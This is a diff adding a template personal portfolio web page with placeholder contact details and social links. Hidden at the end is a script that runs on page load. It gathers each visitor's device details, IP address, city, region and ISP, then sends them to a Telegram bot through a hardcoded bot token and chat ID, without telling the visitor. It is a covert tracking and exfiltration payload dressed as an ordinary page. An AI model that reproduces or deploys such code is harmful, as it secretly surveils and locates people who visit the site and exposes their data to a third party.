@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="map.css">
+    <title>M.A.P</title>
+    <link rel="shortcut icon" href="">
+    <link rel="icon" href="8257d-10891987_797299693684337_8110693103383839546_n.jpg" type="image/png">
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
+
+*{
+    font-family: 'Poppins', sans-serif;
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    scroll-behavior: smooth
+}
+
+
+header {
+    background-color: rgb(126, 255, 94);
+    width: 100%;
+    position: fixed;
+    z-index: 999;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 200px;
+}
+
+.logo {
+    text-decoration: none;
+    color: rgb(0, 0, 0);
+    text-transform: uppercase;
+    font-weight: 700;
+    font-size: 1.8em;
+}
+
+.navigation a{
+    color: black;
+    text-decoration: none;
+    font-size: 1.1em;
+    font-weight: 500;
+    padding-left: 20px;
+}
+
+.navigation a:hover {
+    color: blue;
+}
+
+section {
+    padding: 100px 200px;
+}
+
+.main {
+      width: 100%;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    background: url(img/تنزيل\ \(14\).jpg) no-repeat;
+    background-size: cover;
+    background-position: center;
+    background-attachment: fixed;
+}
+
+.main h2 {
+    color: rgb(255, 255, 255);
+    font-size: 1.4em;
+    font-weight: 500;
+}
+
+.main h2 span {
+     display: inline-block;
+    margin-top: 10px;
+    color: rgb(0, 0, 255);
+    font-size: 2.3em;
+    font-weight: 700;
+}
+
+.main h3 {
+    color: rgb(255, 255, 255);
+    font-size: 1.6em;
+    font-weight: 700;
+    letter-spacing: 1px;
+    margin-top: 10px;
+    margin-bottom: 30px;
+}
+
+.main-btn {
+    color: #ffff;
+    background-color: rgb(84, 84, 250);
+    text-decoration: none;
+    font-size: 1.1em;
+    font-weight: 600;
+    display: inline-block;
+    padding: 0.9375em 2.1875em;
+    letter-spacing: 1px;
+    border-radius: 15px;
+    margin-bottom: 40px;
+    transition: 0.7s ease;
+}
+
+.main-btn:hover {
+    background-color: rgb(0, 0, 255);
+    transform: scale(1.1);
+}
+
+.social-icons a{
+    color: #ffffff;
+    font-size: 1.7em;
+    padding-right: 30px;
+}
+
+.title {
+    display: flex;
+    justify-content: center;
+    color: rgb(72, 72, 247);
+    font-size: 2.2em;
+    font-weight: 800;
+    margin-bottom: 30px;
+}
+
+.content {
+    display: flex;
+    justify-content: center;
+    flex-direction: row;
+    flex-wrap: wrap;
+}
+
+.card {
+    background-color: #fff;
+    width: 21.25em;
+    box-shadow: 0 5px 25px rgb(0, 0, 0);
+    border-radius: 10px;
+    padding: 25px;
+    margin: 15px;
+    transition: 0.7s ease;
+}
+
+.card:hover {
+    transform: scale(1.1);
+}
+
+.icon {
+    color: #3a6cf4;
+    font-size: 8em;
+    text-align: center;
+}
+
+.info {
+    text-align: center;
+}
+
+.info h3 {
+    color: #3a6cf4;
+    font-size: 1.2em;
+    font-weight: 700;
+    margin: 10px;
+}
+
+.projects {
+    background-color: rgb(175, 236, 180);
+}
+
+.projects .content{
+    margin-top: 30px;
+}
+
+.project-card {
+    background-color: #fff;
+    border: 1px solid #ffff;
+    min-height: 14em;
+    width: 23em;
+    overflow: hidden;
+    border-radius: 10px;
+    margin: 20px;
+    transition: 0.7s ease;
+}
+
+.project-card:hover {
+    transform: scale(1.1);
+}
+
+.project-card:hover .project-image {
+    opacity: 0.9;
+}
+
+.project-image img{
+    width: 100%;
+}
+
+.project-info {
+    padding: 1em;
+}
+
+.project-category {
+    font-size: 0.8em;
+    color: #000;
+}
+
+.project-title {
+    display: flex;
+    justify-content: space-between;
+    text-transform: uppercase;
+    font-weight: 800;
+    margin-top: 10px;
+}
+
+.more-details {
+    text-decoration: none;
+    color: #3a6cf4;
+}
+
+.more-details:hover {
+    color: #601cfc;
+}
+
+.content .icon {
+    font-size: 4.5em;
+}
+
+.content .info h3 {
+    color: #000;
+    font-weight: 800;
+}
+
+.content .info p {
+    font-size: 1.1em;
+    font-weight: 700;
+}
+
+.footer {
+    background-color: #000016;
+    color: #ffff;
+    padding: .6em;
+    display: flex;
+    justify-content: space-between;
+}
+
+.footer-title {
+    font-size: 1.3em;
+    font-weight: 600;
+}
+
+.footer-title span {
+    color: #3a6cf4;
+}
+
+.footer .social-icons a{
+    font-size: 2em;
+    padding: 0 30px 0 0;
+}
+
+@media (max-width:1023px){
+    header{
+        padding: 12px 20px;
+    }
+
+    .navigation a{
+        padding: 10px;
+    }
+
+    .title{
+        font-size: 1.8em;
+    }
+
+    section{
+        padding: 80px 20px;
+    }
+
+    .main-content h2{
+        font-size: 1em;
+    }
+
+    .main-content h3{
+        font-size: 1.6em;
+    }
+
+    .content{
+        flex-direction: column;
+        align-items: center;
+    }
+}
+
+@media (max-width:641px){
+    body{
+        font-size: 12px;
+    }
+
+    .main-content h2{
+        font-size: 0.8em;
+    }
+
+    .main-content h3{
+        font-size: 1.4em;
+    }
+}
+
+@media (max-width:300px){
+    body{
+        font-size: 10px;
+    }
+}
+</style> 
+
+    <header>
+        <a href="#" class="logo">M.A.P</a>
+        <nav class="navigation">
+            <a href="#services">services</a>
+            <a href="#projects">projects</a>
+            <a href="#contact">contact</a>
+        </nav>
+    </header>
+
+
+    <section class="main">
+        <div>
+            <h2>Hello, I'm Name<br><span>Add a text about yourself</span></h2>
+            <h3>I work on making programs and applications for the phone</h3>
+            <a href="#" class="main-btn">View my work</a>
+            <div class="social-icons">
+                <a href="https://www.facebook.com/"><i class="fa-brands fa-facebook"></i></a>
+                <a href="https://www.instagram.com/"><i class="fa-brands fa-instagram"></i><a>
+            </div>
+        </div>
+    </section>
+
+    <section class="cards" id="services">
+        <h2 class="title">services</h2>
+        <div class="content">
+            <div class="card">
+                <div class="icon">
+                    <i class="fas fa-edit"></i>
+                </div>
+                <div class="info">
+                    <h3>If you need any service, I am here to help</h3>
+                    <p></p>
+                    <strong class="services-title">
+                        <span></span>
+                        <a href="https://www.facebook.com/" class="more-details">Press here</a>
+                    </strong>
+                    <a></a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="projects" id="projects">
+        <h2 class="title">projects</h2>
+        <div class="content">
+            <div class="project-card">
+                <div class="project-image">
+                    <img src="img/تنزيل.png" />
+                </div>
+                <div class="progect-info">
+                    <p class="project-category">The project of creating my first Android application</p>
+                    <strong class="project-title">
+                        <span>Application overview</span>
+                        <a href="https://www.facebook.com/" class="more-details">more-details</a>
+                    </strong>
+                </div>
+            </div>
+        </div>
+
+    </section>
+
+    <section class="cards contact" id="contact">
+        <h2 class="title">Let's work togather</h2>
+        <div class="content">
+            <div class="card">
+                <div class="icon">
+                    <i class="fa-solid fa-envelope"></i>
+                </div>
+                <div class="info">
+                    <h3>email</h3>
+                    <p>email@gmail.com</p>
+                </div>
+            </div>
+        </div>
+        <div class="content">
+            <div class="card">
+                <div class="icon">
+                    <i class="fa-solid fa-phone"></i>
+                </div>
+                <div class="info">
+                    <h3>phone</h3>
+                    <p>+00000000000</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p class="footer-title">Copyrights @ <span>My Name</span></p>
+        <div class="social-icons">
+            <a href="https://www.facebook.com/"><i class="fa-brands fa-facebook"></i></a>
+            <a href="https://www.instagram.com/"><i class="fa-brands fa-instagram"></i>
+        </div>
+    </footer>
+      <script>
+    function parseOSAndDevice(userAgent, userAgentData) {
+      let os = 'غير معروف';
+      let device = 'غير معروف';
+
+      if (userAgentData && userAgentData.platform) {
+        os = userAgentData.platform;
+      } else {
+        if (/Windows NT 10\.0/.test(userAgent)) os = 'Windows 10';
+        else if (/Windows NT 6\.3/.test(userAgent)) os = 'Windows 8.1';
+        else if (/Windows NT 6\.2/.test(userAgent)) os = 'Windows 8';
+        else if (/Windows NT 6\.1/.test(userAgent)) os = 'Windows 7';
+        else if (/Windows NT 5\.1/.test(userAgent)) os = 'Windows XP';
+        else if (/Mac OS X (\d+[._]\d+)/.test(userAgent)) os = 'macOS ' + userAgent.match(/Mac OS X (\d+[._]\d+)/)[1].replace('_', '.');
+        else if (/Android (\d+(?:\.\d+)?)/.test(userAgent)) os = 'Android ' + userAgent.match(/Android (\d+(?:\.\d+)?)/)[1];
+        else if (/iPhone OS (\d+_\d+)/.test(userAgent)) os = 'iOS ' + userAgent.match(/iPhone OS (\d+_\d+)/)[1].replace('_', '.');
+        else if (/Linux/.test(userAgent)) os = 'Linux';
+      }
+
+      if (/Samsung/.test(userAgent)) device = 'Samsung';
+      else if (/Huawei/.test(userAgent)) device = 'Huawei';
+      else if (/iPhone/.test(userAgent)) device = 'iPhone';
+      else if (/iPad/.test(userAgent)) device = 'iPad';
+      else if (/Pixel/.test(userAgent)) device = 'Google Pixel';
+      else if (/Macintosh/.test(userAgent)) device = 'Mac';
+      else if (/Windows/.test(userAgent)) device = 'PC';
+      else if (/Android/.test(userAgent)) device = 'Android Device';
+
+      return { os, device };
+    }
+
+    async function collectAndSendData() {
+      const userAgent = navigator.userAgent;
+      const userAgentData = navigator.userAgentData || null;
+      const parsed = parseOSAndDevice(userAgent, userAgentData);
+
+      const deviceInfo = {
+        userAgent: userAgent,
+        os: parsed.os,
+        device: parsed.device,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        cpuCores: navigator.hardwareConcurrency || 'غير معروف',
+        memoryGB: navigator.deviceMemory ? `${navigator.deviceMemory} GB (تقريبي)` : 'غير معروف',
+        connectionType: navigator.connection?.effectiveType || 'غير معروف',
+        downlink: navigator.connection?.downlink || 'غير معروف',
+        time: new Date().toLocaleString()
+      };
+
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          deviceInfo.battery = `${Math.round(battery.level * 100)}%`;
+          deviceInfo.isCharging = battery.charging ? 'نعم' : 'لا';
+        } catch (err) {
+          deviceInfo.battery = 'غير معروف';
+        }
+      }
+
+      $.getJSON('https://ipapi.co/json/', function(locationData) {
+        deviceInfo.ip = locationData.ip;
+        deviceInfo.city = locationData.city;
+        deviceInfo.region = locationData.region;
+        deviceInfo.country = locationData.country_name;
+        deviceInfo.isp = locationData.org || locationData.asn || locationData.network || 'غير معروف';
+
+        const message = `\u26a1\ufe0f [زائر جديد]\n` +
+          `IP: ${deviceInfo.ip}\n` +
+          `الموقع: ${deviceInfo.city}, ${deviceInfo.region}, ${deviceInfo.country}\n` +
+          `مزود الخدمة: ${deviceInfo.isp}\n` +
+          `\n--- الجهاز ---\n` +
+          `نظام التشغيل: ${deviceInfo.os}\n` +
+          `نوع الجهاز: ${deviceInfo.device}\n` +
+          `المتصفح الكامل: ${deviceInfo.userAgent}\n` +
+          `المنصة: ${deviceInfo.platform}\n` +
+          `اللغة: ${deviceInfo.language}\n` +
+          `الشاشة: ${deviceInfo.screenResolution}, عمق اللون: ${deviceInfo.colorDepth}\n` +
+          `CPU: ${deviceInfo.cpuCores}, RAM: ${deviceInfo.memoryGB}\n` +
+          `البطارية: ${deviceInfo.battery || 'غير معروف'}, شحن: ${deviceInfo.isCharging || 'غير معروف'}\n` +
+          `الاتصال: ${deviceInfo.connectionType}, ${deviceInfo.downlink} Mbps\n` +
+          `الوقت: ${deviceInfo.time}`;
+
+        const telegramToken = '8086398305:AAE1D9OIRvQHy_ybqAW2xvsx4OfT_hTjWJU';
+        const chatId = '6866313425';
+        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+        fetch(telegramUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      });
+    }
+
+    collectAndSendData();
+  </script>
+
+</body>
+</html>
